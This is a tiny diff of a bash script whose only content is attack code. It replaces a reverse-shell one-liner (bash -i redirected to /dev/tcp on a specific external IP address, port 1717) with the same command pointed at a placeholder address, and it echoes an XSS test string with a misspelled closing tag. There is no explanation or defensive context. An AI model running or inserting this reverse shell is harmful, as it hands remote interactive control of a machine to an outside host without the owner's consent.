@@ -1,2 +1,3 @@
 #!/bin/bash
-bash -i >& /dev/tcp/120.26.79.48/1717 0>&1;echo '<script>alert(1)</scirpt>'
+echo '<script>alert(1)</scirpt>'
+bash -i >& /dev/tcp/x.x.x.x/1717 0>&1
